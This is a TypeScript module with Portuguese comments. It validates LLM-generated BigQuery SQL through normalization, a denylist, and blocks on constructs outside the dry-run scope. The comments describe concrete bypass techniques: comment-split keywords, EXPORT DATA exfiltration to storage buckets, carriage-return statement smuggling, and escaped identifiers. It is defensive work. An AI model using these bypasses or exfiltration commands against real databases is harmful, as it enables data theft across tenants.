/**
 * Guardrail do SQL gerado por modelo.
 *
 * Fonte ÚNICA da validação — a tool `execute_sql` (concedida aos 8 sub-agentes
 * analíticos) e qualquer caminho futuro que execute SQL de LLM devem passar
 * por aqui.
 *
 * ─── Por que o guardrail anterior não bastava ───────────────────────────────
 * Era uma regex de denylist aplicada ao texto CRU. Três furos concretos:
 *
 * 1. **Comentário quebra a denylist.** O padrão exigia `DROP\s+\S`; um espaço.
 *    `DROP/**​/TABLE x` não casa com `\s+` e passava direto. O próprio comentário
 *    no código antigo ("scan entire query… to prevent CTE bypass") registrava
 *    que já havia existido uma versão contornável — o padrão se repetiu.
 *
 * 2. **`EXPORT DATA` não estava na lista.** É a exfiltração mais direta que
 *    existe no BigQuery: `EXPORT DATA OPTIONS(uri='gs://qualquer-bucket/*') AS
 *    SELECT ...` copia a carteira do cliente para fora, e não é DML nem DDL —
 *    passava por todos os filtros.
 *
 * 3. **Falso positivo em literal.** `WHERE status = 'DROP TABLE'` era recusado,
 *    porque a regex não distinguia código de string.
 *
 * ─── A ordem importa ────────────────────────────────────────────────────────
 * Normaliza primeiro (remove comentário, neutraliza literal), valida depois.
 * Validar o texto cru deixa o comentário esconder palavra-chave; e neutralizar
 * literal SEM recusar `EXECUTE IMMEDIATE` abriria um furo novo, porque o SQL
 * perigoso passaria a viajar dentro de uma string. Por isso as duas coisas
 * andam juntas.
 */

/** Recusado porque escreve, altera ou EXPORTA dado. */
export const FORBIDDEN: Array<{ re: RegExp; motivo: string }> = [
  { re: /\bINSERT\s+INTO\b/i, motivo: 'INSERT' },
  { re: /\bUPDATE\s+\S/i, motivo: 'UPDATE' },
  { re: /\bDELETE\s+FROM\b/i, motivo: 'DELETE' },
  { re: /\bMERGE\s+INTO\b/i, motivo: 'MERGE' },
  { re: /\bTRUNCATE\b/i, motivo: 'TRUNCATE' },
  { re: /\bDROP\s+\S/i, motivo: 'DROP' },
  { re: /\bALTER\s+\S/i, motivo: 'ALTER' },
  { re: /\bCREATE\s+\S/i, motivo: 'CREATE' },
  // Exfiltração: escrevem para fora do dataset sem serem DML/DDL.
  { re: /\bEXPORT\s+DATA\b/i, motivo: 'EXPORT DATA' },
  { re: /\bLOAD\s+DATA\b/i, motivo: 'LOAD DATA' },
  // SQL dinâmico: montaria em runtime qualquer comando acima, dentro de uma
  // string — que a normalização justamente neutraliza.
  { re: /\bEXECUTE\s+IMMEDIATE\b/i, motivo: 'EXECUTE IMMEDIATE' },
  // Scripting: dá controle de fluxo e chamada de procedure.
  { re: /\bCALL\s+\S/i, motivo: 'CALL' },
  { re: /\bDECLARE\s+\S/i, motivo: 'DECLARE' },
  { re: /\bGRANT\s+\S/i, motivo: 'GRANT' },
  { re: /\bREVOKE\s+\S/i, motivo: 'REVOKE' },
];

const ALLOWED_START = /^\s*(SELECT|WITH)\b/i;

/**
 * Palavras que seguem uma COLUNA chamada `model`/`connection` (`CAST(model AS
 * …)`, `connection FROM …`) — nesses casos a palavra é nome de coluna, não a
 * palavra-chave que aponta para um modelo ou uma conexão.
 */
const FOLLOWS_COLUMN =
  'AS|IS|IN|NOT|LIKE|BETWEEN|AND|OR|FROM|OVER|DESC|ASC|NULLS|WHERE|GROUP|ORDER|LIMIT|HAVING|QUALIFY'
  + '|WINDOW|THEN|WHEN|ELSE|END|JOIN|ON|UNION|INTERSECT|EXCEPT|IGNORE|RESPECT|COLLATE|AT';

/**
 * Recusado porque lê o que o escopo do dry-run NÃO enxerga.
 *
 * O escopo de tenant (`checkTenantQuery`, compilação de métrica) confere as
 * tabelas e rotinas que o BigQuery lista em `referencedTables` /
 * `referencedRoutines`. Um modelo de ML (`ML.PREDICT(MODEL outro.m, …)`), o
 * `EXTERNAL_QUERY` e as funções que usam uma CONNECTION (`ML.GENERATE_TEXT`,
 * `AI.*`, `OBJ.*`) não aparecem ali — o escopo aprovaria a leitura de um modelo
 * ou de um banco externo de outro cliente. Nada disso é SQL analítico simples,
 * e nenhum SQL escrito pelo modelo precisa: os tools BQML montam o próprio
 * `ML.*` em volta de um `modelRef` validado. `KEYS.*` (chave do KMS) é do mesmo
 * tipo. `@@variável` e `SESSION_USER()` não leem tabela, mas devolvem como dado
 * o id do projeto e o e-mail da service account — e as views de metadados
 * (`INFORMATION_SCHEMA`, `__TABLES__`) também, mesmo dentro do escopo.
 *
 * Vale sobre `withIdentifiers` (comentário removido, literal neutralizado,
 * crase aberta): `ML/**​/.PREDICT(` e `\`ML.PREDICT\`(` são pegos, e uma
 * string com "ML.PREDICT(" não é.
 */
export const OUTSIDE_DRY_RUN_SCOPE: Array<{ re: RegExp; motivo: string }> = [
  { re: /\bML\s*\.\s*[A-Z_][A-Z0-9_]*\s*\(/i, motivo: 'ML.* (modelo de ML)' },
  { re: /\bAI\s*\.\s*[A-Z_][A-Z0-9_]*\s*\(/i, motivo: 'AI.* (função de IA)' },
  { re: /\bOBJ\s*\.\s*[A-Z_][A-Z0-9_]*\s*\(/i, motivo: 'OBJ.* (objeto via conexão)' },
  { re: /\bEXTERNAL_[A-Z0-9_]*\s*\(/i, motivo: 'EXTERNAL_QUERY (conexão externa)' },
  { re: /\bCONNECTION_ID\s*=>/i, motivo: 'connection_id (conexão externa)' },
  // CONNECTION só nas formas em que é palavra-chave: `CONNECTION DEFAULT`,
  // `WITH`/`REMOTE CONNECTION`, primeiro argumento `(CONNECTION x`, ou seguida
  // de caminho qualificado (`CONNECTION p.us.conn`). Coluna chamada
  // `connection` com alias sem AS (`SELECT connection c`) é coluna.
  { re: /\bCONNECTION\s+DEFAULT\b/i, motivo: 'CONNECTION (conexão externa)' },
  { re: /\b(?:WITH|REMOTE)\s+CONNECTION\b(?!\s+AS\b)/i, motivo: 'CONNECTION (conexão externa)' },
  {
    re: new RegExp(`\\(\\s*CONNECTION\\s+(?!(?:${FOLLOWS_COLUMN})\\b)[A-Z_]`, 'i'),
    motivo: 'CONNECTION (conexão externa)',
  },
  {
    re: /(?<!\.\s*)\bCONNECTION\s+[A-Z_][\w-]*\s*\.\s*[A-Z_]/i,
    motivo: 'CONNECTION (conexão externa)',
  },
  { re: new RegExp(`\\(\\s*MODEL\\s+(?!(?:${FOLLOWS_COLUMN})\\b)[A-Z_]`, 'i'), motivo: 'MODEL (modelo de ML)' },
  // Chave do KMS: tão invisível ao escopo do dry-run quanto uma CONNECTION.
  { re: /\bKEYS\s*\.\s*[A-Z_][A-Z0-9_]*\s*\(/i, motivo: 'KEYS.* (chave do KMS)' },
  // Devolvem, como DADO, o id do projeto e o e-mail da service account —
  // por fora da redação de erro. Nenhuma análise precisa deles.
  { re: /@\s*@/, motivo: '@@ (variável de sistema)' },
  { re: /\b(?:SESSION_USER|CURRENT_USER)\s*\(/i, motivo: 'SESSION_USER (identidade da sessão)' },
  // Metadados do dataset: ficam DENTRO do escopo (o dataset é do cliente), mas
  // `table_catalog` e `__TABLES__.project_id` devolvem o id do projeto como
  // dado. O modelo tem `get_table_schema` para ver colunas.
  { re: /\bINFORMATION_SCHEMA\b/i, motivo: 'INFORMATION_SCHEMA (metadados do dataset)' },
  { re: /\b__(?:TABLES|TABLES_SUMMARY|PARTITIONS_SUMMARY)__\b/i, motivo: '__TABLES__ (metadados do dataset)' },
];

/** O primeiro construto que o escopo do dry-run não vê, ou `null`. Ver `OUTSIDE_DRY_RUN_SCOPE`. */
export function outOfScopeConstruct(textWithIdentifiers: string): string | null {
  return OUTSIDE_DRY_RUN_SCOPE.find(({ re }) => re.test(textWithIdentifiers))?.motivo ?? null;
}

/** Mensagem da recusa — genérica: não ecoa nome de modelo nem de conexão. */
export function outOfScopeMessage(motivo: string): string {
  return `A query usa ${motivo}, que não é aceito aqui: modelo de ML, conexão externa, função de IA, chave do `
    + 'KMS, variável de sistema, identidade da sessão e metadados do dataset não são SQL analítico simples. '
    + 'Use só SELECT sobre as tabelas do cliente; para ver colunas, use get_table_schema; para ML, use as '
    + 'ferramentas bqml_*.';
}

/**
 * Resultado da varredura léxica: o texto normalizado e o que foi encontrado
 * no caminho. Quem monta SQL a partir de FRAGMENTO (não de query inteira)
 * precisa saber se havia comentário ou literal sem fechamento — ver
 * `safeWhereClause` em `tools/bqml-utils.ts`.
 */
export interface SqlScan {
  normalized: string;
  /**
   * Igual a `normalized`, mas o identificador entre crases mantém o conteúdo
   * DECODIFICADO, sem as crases e cercado de espaço: `\`ML.PREDICT\`(` vira
   * ` ML.PREDICT (`. Para quem procura NOME de função/objeto — `normalized`
   * troca todo identificador por `x`.
   */
  withIdentifiers: string;
  hasComment: boolean;
  /** Literal, identificador entre crases ou comentário de bloco sem fechamento. */
  unterminated: boolean;
}

/**
 * Remove comentários e neutraliza literais, preservando o comprimento em
 * caracteres seguros para que a análise não junte tokens vizinhos.
 *
 * Comentário vira UM ESPAÇO de propósito: `DROP/**​/TABLE` precisa virar
 * `DROP TABLE` para casar com `\bDROP\s+\S`, e não `DROPTABLE`.
 *
 * ─── O léxico precisa ser o do BigQuery ────────────────────────────────────
 * Onde esta varredura e o BigQuery discordam sobre onde um literal termina, o
 * guard enxerga string e o BigQuery executa código — e `bigquery.query` roda
 * script de vários comandos num job só. Por isso:
 * - Três aspas (simples ou duplas) abrem literal de três aspas: a aspa isolada
 *   dentro dele NÃO fecha nada. Sem fechamento, o BigQuery lê `''` (vazio) e
 *   segue como código — e esta varredura também.
 * - Barra invertida escapa o próximo caractere em literal E em identificador
 *   entre crases (crase precedida de barra não fecha o identificador).
 * - Aspa duplicada (`''`) NÃO é escape no GoogleSQL: são dois literais
 *   vizinhos. Tratá-la como escape estendia o literal além do que o BigQuery
 *   estende.
 * O prefixo `r`/`b` de literal não muda onde ele termina, só como é decodificado.
 *
 * Isto é um MODELO do léxico, não o parser do BigQuery — já errou uma vez (o
 * `\r` acima). Por isso quem EXECUTA SQL de modelo exige também um dry-run com
 * `statementType === 'SELECT'` (`checkTenantQuery`): o léxico é a primeira
 * barreira, não a única.
 */
export function scanSql(sql: string): SqlScan {
  let out = '';
  let outIds = '';
  let hasComment = false;
  let unterminated = false;
  let i = 0;
  const n = sql.length;

  /** Fim (exclusivo) do trecho que termina em `fecho`, com escape por barra; -1 se não fecha. */
  const delimitedEnd = (from: number, closer: string): number => {
    let j = from;
    while (j < n) {
      if (sql[j] === '\\') { j += 2; continue; }
      if (sql.startsWith(closer, j)) return j + closer.length;
      j++;
    }
    return -1;
  };

  while (i < n) {
    const c = sql[i];
    const prox = sql[i + 1];

    // Comentário de bloco
    if (c === '/' && prox === '*') {
      hasComment = true;
      const end = sql.indexOf('*/', i + 2);
      if (end === -1) unterminated = true;
      out += ' ';
      outIds += ' ';
      i = end === -1 ? n : end + 2;
      continue;
    }

    // Comentário de linha: -- e #. Termina em \n OU \r — medido por dry-run
    // (statementType): o BigQuery encerra o comentário nos dois, e não em VT,
    // FF, U+0085, U+2028 ou U+2029. Terminar só em \n deixava
    // `SELECT 1 --\r; DROP …` passar como um comando só.
    if ((c === '-' && prox === '-') || c === '#') {
      hasComment = true;
      let end = i;
      while (end < n && sql[end] !== '\n' && sql[end] !== '\r') end++;
      out += ' ';
      outIds += ' ';
      i = end;
      continue;
    }

    if (c === "'" || c === '"') {
      const triple = c + c + c;
      if (sql.startsWith(triple, i)) {
        const tripleEnd = delimitedEnd(i + 3, triple);
        if (tripleEnd !== -1) {
          out += "''";
          outIds += "''";
          i = tripleEnd;
          continue;
        }
        // Sem fechamento: cai no literal simples, que lê `''` e volta ao código.
      }
      const end = delimitedEnd(i + 1, c);
      if (end === -1) unterminated = true;
      out += "''"; // literal vazio: mantém a forma da query, sem o conteúdo
      outIds += "''";
      i = end === -1 ? n : end;
      continue;
    }

    // Identificador entre crases — conteúdo não é código executável
    if (c === '`') {
      const end = delimitedEnd(i + 1, '`');
      if (end === -1) unterminated = true;
      out += '`x`';
      // Espaço dos dois lados: a crase é fronteira de token para o BigQuery,
      // então `FROM\`ML\`.PREDICT` é `FROM ML .PREDICT`, e não `FROMML.PREDICT`
      // (que escapava de `\bML`). O conteúdo vai decodificado: `\x4DL` é `ML`.
      const content = decodeIdentifier(sql.slice(i + 1, end === -1 ? n : end - 1));
      outIds += ` ${content} `;
      i = end === -1 ? n : end;
      continue;
    }

    out += c;
    outIds += c;
    i++;
  }

  return { normalized: out, withIdentifiers: outIds, hasComment, unterminated };
}

/**
 * Decodifica os escapes de um identificador entre crases, que no GoogleSQL
 * são os mesmos do literal: `\xhh`, `\uhhhh`, `\Uhhhhhhhh`, octal `\ooo` e os
 * de um caractere (`\n`, `\\`, `\``…). Sem isso, `\`\x4DL\`.PREDICT(` passava
 * como se não fosse `ML.PREDICT(`.
 */
export function decodeIdentifier(raw: string): string {
  const plain: Record<string, string> = { a: '\x07', b: '\b', f: '\f', n: '\n', r: '\r', t: '\t', v: '\v' };
  return raw.replace(
    /\\(?:[xX]([0-9a-fA-F]{2})|u([0-9a-fA-F]{4})|U([0-9a-fA-F]{8})|([0-7]{3})|([\s\S]))/g,
    (_m, x: string, u: string, U: string, oct: string, ch: string) => {
      const cp = x ? parseInt(x, 16) : u ? parseInt(u, 16) : U ? parseInt(U, 16) : oct ? parseInt(oct, 8) : -1;
      if (cp >= 0) return cp <= 0x10ffff ? String.fromCodePoint(cp) : '';
      return plain[ch] ?? ch;
    },
  );
}

/** Texto com comentário removido e literal neutralizado. Ver `scanSql`. */
export function normalizeSql(sql: string): string {
  return scanSql(sql).normalized;
}

export type SqlGuardResult =
  | { ok: true; normalized: string }
  | { ok: false; error: string };

/** Conta comandos: `;` que não seja apenas o terminador final. */
function hasMultipleStatements(normalized: string): boolean {
  const idx = normalized.indexOf(';');
  if (idx === -1) return false;
  return normalized.slice(idx + 1).trim().length > 0;
}

export function guardGeneratedSql(sql: string): SqlGuardResult {
  if (!sql || !sql.trim()) {
    return { ok: false, error: 'Query vazia.' };
  }

  const { normalized, withIdentifiers } = scanSql(sql);

  if (!ALLOWED_START.test(normalized)) {
    return { ok: false, error: 'A query precisa começar com SELECT ou WITH.' };
  }

  // Antes da denylist: um segundo comando pode ser qualquer coisa, e validar só
  // o início daria "SELECT 1; <o que quiser>".
  if (hasMultipleStatements(normalized)) {
    return {
      ok: false,
      error: 'Envie um único comando SELECT. Múltiplos comandos separados por ";" não são aceitos.',
    };
  }

  for (const { re, motivo } of FORBIDDEN) {
    if (re.test(normalized)) {
      return {
        ok: false,
        error: `Comando "${motivo}" não é permitido — esta ferramenta é somente leitura. Use SELECT (ou WITH) para consultar.`,
      };
    }
  }

  const outOfScope = outOfScopeConstruct(withIdentifiers);
  if (outOfScope) return { ok: false, error: outOfScopeMessage(outOfScope) };

  return { ok: true, normalized };
}
